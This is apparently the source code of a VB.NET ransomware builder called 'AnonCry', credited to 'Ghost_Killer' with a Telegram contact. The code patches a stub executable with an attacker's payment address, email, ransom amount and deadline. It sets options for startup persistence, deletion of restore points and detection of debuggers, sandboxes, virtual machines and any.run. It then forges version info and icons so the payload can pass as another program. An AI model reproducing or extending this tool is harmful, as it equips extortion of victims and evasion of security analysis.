﻿Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Text

Public Class Form1
    Public iconpathhh As String
    Public assmb As String
    Public outs As String
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Try
            Dim ico As Icon = Icon.ExtractAssociatedIcon(Process.GetCurrentProcess.MainModule.FileName)
            Me.Icon = ico

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        MessageBox.Show("Coded By Ghost_Killer" & vbCrLf & "Coded In vb.net" & vbCrLf & "Discord username : Ghost_Killer#2729" & vbCrLf & "Telegram : https://t.me/Ghost_Toolkit" & vbCrLf & "Warning : I am not responsible for your actions", "About")
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If TextBox1.Text = Nothing Or TextBox2.Text = Nothing Or TextBox3.Text = Nothing Or TextBox4.Text = Nothing Or TextBox5.Text = Nothing Or TextBox6.Text = Nothing Or TextBox7.Text = Nothing Or TextBox8.Text = Nothing Then
        Else
            Try


                Dim NewDir As New SaveFileDialog

                NewDir.Filter = "(*.exe)|*.exe"
                NewDir.FileName = "AnonCry.exe"

                If NewDir.ShowDialog = Windows.Forms.DialogResult.OK Then
                    Button2.Text = "Wait..."
                    Button2.Enabled = False
                    outs = NewDir.FileName
                    Dim Stub As AssemblyDefinition = AssemblyDefinition.ReadAssembly(AppDomain.CurrentDomain.BaseDirectory + "Tools\Stub.exe")
                    Dim validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

                    Dim sb As New StringBuilder()
                    Dim rand As New Random()
                    For i As Integer = 1 To 16
                        Dim idx As Integer = rand.Next(0, validchars.Length)
                        Dim randomChar As Char = validchars(idx)
                        sb.Append(randomChar)
                    Next i

                    Dim randomString = sb.ToString()
                    If IO.File.Exists(AppDomain.CurrentDomain.BaseDirectory + "Tools\Stub.exe") = False Then
                        MsgBox("STUB NOT FOUND")
                        Exit Sub
                    End If
                    Dim a = Mono.Cecil.AssemblyDefinition.ReadAssembly(AppDomain.CurrentDomain.BaseDirectory + "Tools\Stub.exe")
                    For Each x In a.Modules
                        For Each xx In x.Types
                            For Each xxx In xx.Methods
                                If xxx.IsConstructor Then
                                    If xxx.HasBody Then
                                        For Each xxxx In xxx.Body.Instructions
                                            If xxxx.OpCode.Code = Mono.Cecil.Cil.Code.Ldstr And xxxx.Operand IsNot Nothing Then
                                                Select Case xxxx.Operand.ToString
                                                    Case "%exst%"
                                                        xxxx.Operand = TextBox8.Text
                                                    Case "%mute%"
                                                        xxxx.Operand = randomString
                                                    Case "%urlll%"
                                                        xxxx.Operand = TextBox4.Text
                                                    Case "%address%"
                                                        xxxx.Operand = TextBox1.Text

                                                    Case "%email%"
                                                        xxxx.Operand = TextBox2.Text
                                                    Case "%Am%"
                                                        xxxx.Operand = TextBox3.Text

                                                    Case "%H%"
                                                        xxxx.Operand = TextBox5.Text
                                                    Case "%M%"
                                                        xxxx.Operand = TextBox6.Text
                                                    Case "%Attempts%"
                                                        xxxx.Operand = TextBox7.Text

                                                    Case "%startup%"
                                                        If CheckBox1.Checked = True Then
                                                            xxxx.Operand = "True"
                                                        End If

                                                    Case "%RestorePoints%"
                                                        If CheckBox2.Checked = True Then
                                                            xxxx.Operand = "True"
                                                        End If



                                                    Case "%Emulator%"
                                                        If CheckBox7.Checked = True Then
                                                            xxxx.Operand = "True"
                                                        End If
                                                    Case "%DetectDebugger%"
                                                        If CheckBox8.Checked = True Then
                                                            xxxx.Operand = "True"
                                                        End If
                                                    Case "%DetectSandboxie%"
                                                        If CheckBox9.Checked = True Then
                                                            xxxx.Operand = "True"
                                                        End If
                                                    Case "%DetectVirtualMachine%"
                                                        If CheckBox5.Checked = True Then
                                                            xxxx.Operand = "True"
                                                        End If
                                                    Case "%anyrun%"
                                                        If CheckBox10.Checked = True Then
                                                            xxxx.Operand = "True"
                                                        End If






                                                End Select
                                            End If
                                        Next
                                    End If
                                End If
                            Next
                        Next
                    Next
                    a.Write(NewDir.FileName)


                    If CheckBox3.Checked = True Then
                        If IO.File.Exists(assmb) Then
                            Dim pc As Process = Process.Start(AppDomain.CurrentDomain.BaseDirectory + "Tools\ResHacker.exe", " -delete " + outs + "," & outs & ",VERSIONINFO,,")
                            pc.WaitForExit()
                            pc.Close()

                            Dim px As Process = Process.Start(AppDomain.CurrentDomain.BaseDirectory + "Tools\ResHacker.exe", " -extract " & assmb & "," & AppDomain.CurrentDomain.BaseDirectory + "Tools\VERINFO.res" & ",VERSIONINFO,,")
                            px.WaitForExit()
                            px.Close()

                            Dim pxx As Process = Process.Start(AppDomain.CurrentDomain.BaseDirectory + "Tools\ResHacker.exe", " -addoverwrite " & outs & "," & outs & "," & AppDomain.CurrentDomain.BaseDirectory + "Tools\VERINFO.res" & ",VERSIONINFO,1,")
                            pxx.WaitForExit()
                            pxx.Close()

                            Dim ass As String = AppDomain.CurrentDomain.BaseDirectory + "Tools\VERINFO.res"
                            If IO.File.Exists(ass) Then
                                IO.File.Delete(ass)
                            End If
                        End If
                    End If

                    If CheckBox3.Checked = False Then
                        System.Threading.Thread.Sleep("500")
                        Dim x As Process = Process.Start(AppDomain.CurrentDomain.BaseDirectory + "Tools\ResHacker.exe", " -delete " + outs + "," & outs & ",VERSIONINFO,,")
                        x.WaitForExit()
                        x.Close()
                    End If


                    If CheckBox4.Checked = True Then
                        System.Threading.Thread.Sleep("1500")
                        IconInjector.InjectIcon(outs, iconpathhh)
                    End If

                    Dim file1 As String = AppDomain.CurrentDomain.BaseDirectory + "Tools\ResHacker.ini"
                    If IO.File.Exists(file1) Then
                        IO.File.Delete(file1)
                    End If

                    Dim file2 As String = AppDomain.CurrentDomain.BaseDirectory + "Tools\ResHacker.log"
                    If IO.File.Exists(file2) Then
                        IO.File.Delete(file2)
                    End If

                    Button2.Text = "Build"
                    Button2.Enabled = True
                    MsgBox(NewDir.FileName, , "DONE!")
                End If


            Catch ex As Exception
                Button2.Text = "Build"
                Button2.Enabled = True
                MessageBox.Show(ex.Message)
            End Try
        End If
      
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Exe File"
                .Filter = "(*.exe|*.exe"
                If OfD.ShowDialog() = DialogResult.OK Then
                    assmb = OfD.FileName

                Else
                    assmb = Nothing
                    CheckBox3.Checked = False
                End If

            End With


        End If
        If CheckBox3.Checked = False Then
            assmb = Nothing
            CheckBox3.Checked = False
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Icon"
                .Filter = "Icon (*.ico|*.ico"
                If OfD.ShowDialog() = DialogResult.OK Then
                    iconpathhh = OfD.FileName
                    PictureBox1.ImageLocation = (iconpathhh)
                Else
                    iconpathhh = Nothing
                    PictureBox1.Image = Nothing
                    CheckBox4.Checked = False
                End If

            End With


        End If
        If CheckBox4.Checked = False Then
            iconpathhh = Nothing
            PictureBox1.Image = Nothing
            CheckBox4.Checked = False
        End If
    End Sub
End Class
